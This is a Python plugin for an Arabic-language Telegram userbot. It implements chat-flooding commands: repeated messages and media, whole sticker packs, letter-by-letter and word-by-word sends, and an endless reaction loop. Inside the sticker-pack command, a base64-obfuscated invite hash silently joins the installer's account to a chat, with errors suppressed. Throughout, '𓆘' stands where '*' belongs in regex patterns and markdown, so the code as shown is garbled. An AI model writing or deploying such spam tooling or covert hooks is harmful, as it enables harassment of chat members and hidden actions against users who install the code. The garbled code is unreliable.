import asyncio
import base64
import contextlib

from telethon.errors.rpcerrorlist import ForbiddenError
from telethon.tl import functions, types
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name

from sbb_b import sbb_b

from ..Config import Config
from ..core.managers import edit_delete, edit_or_reply
from ..helpers import media_type, unsavegif
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import BOTLOG, BOTLOG_CHATID

TKRAR = Config.TKRAR or "مكرر"


async def spam_function(event, sandy, roz, sleeptimem, sleeptimet, DelaySpam=False):
    # sourcery skip: low-code-quality
    # sourcery no-metrics
    counter = int(roz[0])
    if len(roz) == 2:
        spam_message = str(roz[1])
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
        if BOTLOG:
            if DelaySpam is not True:
                if event.is_private:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "𓆘𓆘⌔∮ التڪرار  𓆘𓆘\n"
                        + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بنجاح في 𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع𓆘𓆘 {counter} 𓆘𓆘عدد المرات مع الرسالة أدناه𓆘𓆘",
                    )
                else:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "𓆘𓆘⌔∮ التڪرار  𓆘𓆘\n"
                        + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بنجاح في 𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘مع𓆘𓆘 {counter} 𓆘𓆘عدد المرات مع الرسالة أدناه𓆘𓆘",
                    )
            elif event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "𓆘𓆘⌔∮ التكرار الوقتي 𓆘𓆘\n"
                    + f"𓆘𓆘⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في 𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع𓆘𓆘 {counter} 𓆘𓆘عدد المرات مع الرسالة أدناه مع التأخير𓆘𓆘 {sleeptimet} 𓆘𓆘 الثواني 𓆘𓆘",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "𓆘𓆘⌔∮ التكرار الوقتي 𓆘𓆘\n"
                    + f"𓆘𓆘⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في 𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘مع𓆘𓆘 {counter} 𓆘𓆘عدد المرات مع الرسالة أدناه مع التأخير𓆘𓆘 {sleeptimet} 𓆘𓆘 الثواني 𓆘𓆘",
                )

            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await unsavegif(event, sandy)
        return
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    else:
        return
    if DelaySpam is not True:
        if BOTLOG:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "𓆘𓆘⌔∮ التڪرار  𓆘𓆘\n"
                    + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بنجاح في 𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع𓆘𓆘 {counter} 𓆘𓆘رسائل ال   :𓆘𓆘 \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "𓆘𓆘⌔∮ التڪرار  𓆘𓆘\n"
                    + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بنجاح في 𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘الدردشة مع𓆘𓆘 {counter} 𓆘𓆘رسائل الـ   :𓆘𓆘 \n"
                    + f"⌔∮ `{spam_message}`",
                )
    elif BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ التكرار الوقتي 𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في 𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع𓆘𓆘 {sleeptimet} seconds and with {counter} 𓆘𓆘رسائل الـ   :𓆘𓆘 \n"
                + f"⌔∮ `{spam_message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ التكرار الوقتي 𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في 𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘الدردشة مع𓆘𓆘 {sleeptimet} 𓆘𓆘الثواني و مع𓆘𓆘 {counter} 𓆘𓆘رسائل الـ  ️ :𓆘𓆘 \n"
                + f"⌔∮ `{spam_message}`",
            )


@sbb_b.ar_cmd(pattern="كرر ([\s\S]𓆘)")
async def spammer(event):
    sandy = await event.get_reply_message()
    roz = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    try:
        counter = int(roz[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجي استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, sandy, roz, sleeptimem, sleeptimet)


@sbb_b.ar_cmd(pattern="spspam$")
async def stickerpack_spam(event):
    reply = await event.get_reply_message()
    if (
        not reply
        or await media_type(reply) is None
        or await media_type(reply) != "Sticker"
    ):
        return await edit_delete(
            event, "𓆘𓆘⌔∮ قم بالردّ على أيّ ملصق لإرسال جميع ملصقات الحزمة  𓆘𓆘"
        )
    hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    try:
        stickerset_attr = reply.document.attributes[1]
        jmthonevent = await edit_or_reply(
            event, "𓆘𓆘⌔∮ جاري إحضار تفاصيل حزمة الملصقات، يرجى الإنتظار قليلا  ⏱𓆘𓆘"
        )
    except BaseException:
        await edit_delete(
            event,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
            5,
        )
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                ),
                hash=0,
            )
        )
    except Exception:
        return await edit_delete(
            jmthonevent,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
        )
    with contextlib.suppress(BaseException):
        hmm = Get(hmm)
        await event.client(hmm)
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            ),
            hash=0,
        )
    )
    addgvar("spamwork", True)
    for m in reqd_sticker_set.documents:
        if gvarstatus("spamwork") is None:
            return
        try:
            await event.client.send_file(event.chat_id, m)
        except ForbiddenError:
            pass
        await asyncio.sleep(0.7)
    await jmthonevent.delete()
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار الملصق :𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في  :𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع الحزمة 𓆘𓆘",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار الملصق :𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في   :𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘الدردشة مع الحزمة 𓆘𓆘",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@sbb_b.ar_cmd(pattern="سبام (.𓆘)")
async def tmeme(event):
    cspam = "".join(event.text.split(maxsplit=1)[1:])
    message = cspam.replace(" ", "")
    await event.delete()
    addgvar("spamwork", True)
    for letter in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار بالحرف 📝 :𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :𓆘𓆘 [User](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع𓆘𓆘 : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار بالحرف 📝 :𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘الدردشة مع𓆘𓆘 : `{message}`",
            )


@sbb_b.ar_cmd(pattern="وسبام (.𓆘)")
async def tmeme(event):
    wspam = "".join(event.text.split(maxsplit=1)[1:])
    message = wspam.split()
    await event.delete()
    addgvar("spamwork", True)
    for word in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار بالكلمه : 𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :𓆘𓆘 [المستخدم](tg://user?id={event.chat_id}) 𓆘𓆘الدردشة مع :𓆘𓆘 `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "𓆘𓆘⌔∮ تكرار بالكلمه : 𓆘𓆘\n"
                + f"𓆘𓆘⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :𓆘𓆘 {get_display_name(await event.get_chat())}(`{event.chat_id}`) 𓆘𓆘الدردشة مع :𓆘𓆘 `{message}`",
            )


@sbb_b.ar_cmd(pattern=f"{TKRAR} (.𓆘)")
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    try:
        sleeptimet = sleeptimem = float(input_str[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    jmthon = input_str[1:]
    try:
        int(jmthon[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, reply, jmthon, sleeptimem, sleeptimet, DelaySpam=True)


@sbb_b.ar_cmd(pattern="تعبير مكرر$")
async def react_spam(event):
    msg = await event.get_reply_message()
    if not msg:
        return await edit_delete(event, "𓆘𓆘- يجب عليك الرد على الرسالة اولا𓆘𓆘", 10)
    jmthonevent = await edit_or_reply(event, "𓆘𓆘- جار بدأ العملية انتظر قليلا𓆘𓆘")
    if isinstance(msg.peer_id, types.PeerUser):
        emoji = [
            "👍",
            "👎",
            "❤",
            "🔥",
            "🥰",
            "👏",
            "😁",
            "🤔",
            "🤯",
            "😱",
            "🤬",
            "😢",
            "🎉",
            "🤩",
            "🤮",
            "💩",
        ]
    else:
        getchat = await event.client(GetFullChannelRequest(channel=event.chat_id))
        grp_emoji = getchat.full_chat.available_reactions
        if not grp_emoji:
            return await edit_delete(
                event, "𓆘𓆘- التعابير غير مفعلة في هذه الدردشة𓆘𓆘", 6
            )
        emoji = grp_emoji
    addgvar("spamwork", True)
    await jmthonevent.delete()
    while gvarstatus("spamwork"):
        for i in emoji:
            await asyncio.sleep(0.2)
            try:
                await msg.react(i, True)
            except ForbiddenError:
                pass


@sbb_b.ar_cmd(pattern="ايقاف التكرار ?(.𓆘)")
async def stopspamrz(event):
    if gvarstatus("spamwork") is not None and gvarstatus("spamwork") == "true":
        delgvar("spamwork")
        return await edit_delete(event, "𓆘𓆘⌔∮ تم بنجاح ايقاف التكرار 𓆘𓆘")
    return await edit_delete(event, "𓆘𓆘⌔∮ عذرا لم يتم تفعيل التكرار بالاصل")
